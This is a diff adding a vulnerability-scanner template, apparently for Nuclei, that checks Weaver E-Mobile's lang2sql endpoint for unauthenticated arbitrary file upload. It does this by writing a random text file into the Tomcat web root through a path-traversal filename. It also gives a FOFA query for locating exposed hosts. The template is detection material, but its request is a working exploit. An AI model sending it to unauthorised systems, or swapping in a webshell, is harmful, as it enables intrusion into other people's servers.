@@ -1,0 +1,46 @@
+id: emobile-lang2sql-fileupload
+
+info:
+  name: 泛微 E-Mobile lang2sql 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    泛微移动管理平台 E-Mobile lang2sql 接口存在任意文件上传，未授权攻击者可上传 WebShell。
+  reference:
+    - https://mp.weixin.qq.com/s/beQWjJW1pt3vjF3PTvwxLA
+  metadata:
+    max-request: 2
+    fofa-query: title="移动管理平台-企业管理"
+  tags: weaver,emobile,fileupload
+
+variables:
+  randstr: '{{rand_base(6)}}'
+  randbody: '{{rand_base(16)}}'
+  rboundary: '{{rand_base(8)}}'
+
+http:
+  - raw:
+      - |
+        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/{{randstr}}.txt"
+
+        {{randbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+      - |
+        GET /{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{randbody}}'
+
+      - type: status
+        status:
+          - 200
